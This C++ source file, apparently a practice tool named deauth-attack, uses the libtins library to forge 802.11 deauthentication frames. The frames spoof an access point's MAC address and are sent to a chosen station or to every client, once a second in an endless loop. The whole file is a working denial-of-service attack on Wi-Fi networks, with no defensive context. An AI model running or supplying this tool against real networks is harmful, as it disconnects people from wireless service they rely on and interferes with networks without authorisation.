#include <iostream>
#include <tins/tins.h>
#include <string>
#include <unistd.h>

#include "mac.h"

using namespace std;
using namespace Tins;

void usage(){
    cout<<"syntax : deauth-attack <interface> <ap mac> [<station mac>]\n";
    cout<<"sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
    return;
}

int main(int argc, char* argv[])
{
    if(argc!=3&&argc!=4){
        usage();
        exit(1);
    }

    string dev=argv[1];
    string ap_mac=argv[2];

    Dot11Deauthentication deauth = Dot11Deauthentication();

    if(argc==3){
        deauth.addr1(string(Mac::broadcastMac()));
        deauth.addr2(ap_mac);
        deauth.addr3(ap_mac);

        RadioTap radio=RadioTap()/deauth;
        PacketSender packetsender(dev);
        while(1){
            packetsender.send(radio);
            sleep(1);
        }
    }
    else if(argc==4){
        string station_mac=argv[3];

        deauth.addr1(station_mac);
        deauth.addr2(ap_mac);
        deauth.addr3(ap_mac);

        RadioTap radio=RadioTap()/deauth;
        PacketSender packetsender(dev);
        while(1){
            packetsender.send(radio);
            sleep(1);
        }
    }

    return 0;

}
